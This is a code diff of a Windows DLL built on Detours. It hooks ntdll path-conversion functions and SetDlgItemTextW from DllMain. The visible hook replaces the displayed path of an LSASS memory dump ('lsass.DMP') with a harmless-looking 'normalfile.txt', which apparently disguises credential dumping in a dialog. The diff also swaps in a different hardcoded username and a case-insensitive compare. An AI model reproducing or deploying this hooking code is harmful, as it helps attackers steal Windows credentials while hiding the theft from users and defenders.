@@ -9,18 +9,19 @@ typedef struct _RTL_RELATIVE_NAME_U* PRTL_RELATIVE_NAME_U;
 
 typedef BYTE BOOLEAN, *PBOOLEAN;
 
-static VOID (NTAPI *Real_RtlInitUnicodeString) (PUNICODE_STRING DestinationString, PCWSTR SourceString) = NULL;
+static VOID(NTAPI* Real_RtlInitUnicodeString) (PUNICODE_STRING DestinationString, PCWSTR SourceString) = NULL;
 
 static NTSTATUS (NTAPI *Real_RtlInitUnicodeStringEx) (UNICODE_STRING* DestinationString, PCWSTR SourceString) = NULL;
 
-static BOOLEAN (NTAPI* Real_RtlDosPathNameToRelativeNtPathName_U) (PCWSTR DosName, PUNICODE_STRING NtName, PCWSTR* PartName, PRTL_RELATIVE_NAME_U RelativeName);
+static BOOLEAN (NTAPI *Real_RtlDosPathNameToRelativeNtPathName_U) (PCWSTR DosName, PUNICODE_STRING NtName, PCWSTR* PartName, PRTL_RELATIVE_NAME_U RelativeName) = NULL;
 
-static NTSTATUS (NTAPI* Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus) (PCWSTR DosFileName, PUNICODE_STRING NtFileName, PCWSTR* FilePath, PRTL_RELATIVE_NAME_U RelativeName, PWSTR* FreeBuffer);
+static NTSTATUS (NTAPI *Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus) (PCWSTR DosFileName, PUNICODE_STRING NtFileName, PCWSTR* FilePath, PRTL_RELATIVE_NAME_U RelativeName, PWSTR* FreeBuffer) = NULL;
 
-static BOOL(WINAPI* pSetDlgItemTextW) (HWND hDlg, int nIDDlgItem, LPCWSTR lpString) = SetDlgItemTextW;
+static BOOL(WINAPI *pSetDlgItemTextW) (HWND hDlg, int nIDDlgItem, LPCWSTR lpString) = SetDlgItemTextW;
 
-PCWSTR newStr = L"C:\\Users\\djreu\\AppData\\Local\\Temp\\normalfile.txt";
-PCWSTR matchStr = L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP";
+PCWSTR newStr = L"C:\\Users\\jhopkins\\AppData\\Local\\Temp\\normalfile.txt";
+PCWSTR matchStr = L"C:\\Users\\jhopkins\\AppData\\Local\\Temp\\lsass.DMP";
+
 
 static NTSTATUS NTAPI __stdcall hookedRtlDosPathNameToRelativeNtPathName_U_WithStatus (PCWSTR DosFileName, PUNICODE_STRING NtFileName, PCWSTR* FilePath, PRTL_RELATIVE_NAME_U RelativeName, PWSTR* FreeBuffer)
 {
@@ -60,7 +61,7 @@ static NTSTATUS NTAPI __stdcall hookedRtlInitUnicodeStringEx(UNICODE_STRING* Des
 
 BOOL hookedSetDlgItemTextW(HWND hDlg, int nIDDlgItem, LPCWSTR lpString)
 {
-    if (wcscmp(lpString, matchStr) == 0)
+    if (lstrcmpiW(lpString, matchStr) == 0)
     {
         return pSetDlgItemTextW(hDlg, nIDDlgItem, (LPCWSTR)newStr);
     }
@@ -73,8 +74,8 @@ BOOL setHooks()
 
     Real_RtlInitUnicodeString   = ((VOID (NTAPI *) (PUNICODE_STRING, PCWSTR)) DetourFindFunction("ntdll.dll", "RtlInitUnicodeString"));
     Real_RtlInitUnicodeStringEx = ((NTSTATUS (NTAPI *) (UNICODE_STRING*, PCWSTR)) DetourFindFunction("ntdll.dll", "RtlInitUnicodeStringEx"));
-    Real_RtlDosPathNameToRelativeNtPathName_U            = ((BOOLEAN (NTAPI* ) (PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U)) DetourFindFunction("ntdll.dll", "RtlDosPathNameToRelativeNtPathName_U"));
-    Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus = ((NTSTATUS (NTAPI* ) (PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U, PWSTR*)) DetourFindFunction("ntdll.dll", "RtlDosPathNameToRelativeNtPathName_U_WithStatus"));
+    Real_RtlDosPathNameToRelativeNtPathName_U            = ((BOOLEAN (NTAPI *) (PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U)) DetourFindFunction("ntdll.dll", "RtlDosPathNameToRelativeNtPathName_U"));
+    Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus = ((NTSTATUS (NTAPI *) (PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U, PWSTR*)) DetourFindFunction("ntdll.dll", "RtlDosPathNameToRelativeNtPathName_U_WithStatus"));
 
     DetourTransactionBegin();
 
@@ -97,11 +98,11 @@ BOOL removeHooks()
 
     DetourUpdateThread(GetCurrentThread());
 
-    DetourDetach(&(PVOID&)Real_RtlInitUnicodeString, hookedRtlInitUnicodeString);
+    DetourDetach(&(PVOID&) Real_RtlInitUnicodeString, hookedRtlInitUnicodeString);
     DetourDetach(&(PVOID&) Real_RtlInitUnicodeStringEx, hookedRtlInitUnicodeStringEx);
     DetourDetach(&(PVOID&) Real_RtlDosPathNameToRelativeNtPathName_U, hookedRtlDosPathNameToRelativeNtPathName_U);
     DetourDetach(&(PVOID&) Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus, hookedRtlDosPathNameToRelativeNtPathName_U_WithStatus);
-    DetourDetach(&(PVOID&)pSetDlgItemTextW, hookedSetDlgItemTextW);
+    DetourDetach(&(PVOID&) pSetDlgItemTextW, hookedSetDlgItemTextW);
 
     DetourTransactionCommit();
 
@@ -120,8 +121,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 		{
 			return TRUE;
 		}
-        setHooks();
-        break;
+		setHooks();
+		break;
     case DLL_THREAD_ATTACH:
         break;
     case DLL_THREAD_DETACH:
